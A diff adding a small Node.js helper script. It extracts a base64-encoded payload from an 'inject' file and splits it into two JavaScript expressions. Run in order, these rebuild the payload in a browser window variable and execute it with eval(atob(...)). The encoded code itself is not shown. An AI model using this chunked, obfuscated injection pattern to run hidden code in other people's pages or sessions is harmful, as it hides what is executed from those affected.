@@ -1,0 +1,13 @@
+const fs = require('fs');
+const p2 = fs.readFileSync('inject-part2.txt', 'utf8');
+const m = p2.match(/atob\("([^"]+)"\)/);
+if (!m) throw new Error('no b64 in inject-part2');
+const b64 = m[1];
+const mid = Math.floor(b64.length / 2);
+const a = b64.slice(0, mid);
+const b = b64.slice(mid);
+const exprA = '(()=>{window.__p2b64="' + a + '";return "p2a";})()';
+const exprB = '(()=>{window.__p2b64+="' + b + '";eval(atob(window.__p2b64));return "p2b";})()';
+fs.writeFileSync('upload-p2a.expr', exprA);
+fs.writeFileSync('upload-p2b.expr', exprB);
+console.log('b64', b64.length, 'a', exprA.length, 'b', exprB.length);
